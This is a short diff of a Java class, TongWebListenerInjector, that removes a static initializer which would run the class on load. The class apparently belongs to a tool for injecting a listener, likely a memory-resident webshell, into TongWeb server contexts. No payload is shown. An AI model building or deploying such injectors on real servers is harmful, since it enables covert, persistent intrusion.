@@ -13,10 +13,6 @@ import java.util.zip.GZIPInputStream;
  */
 public class TongWebListenerInjector {
 
-    static {
-        new TongWebListenerInjector();
-    }
-
     public TongWebListenerInjector() {
         try {
             Set<Object> contexts = getContext();
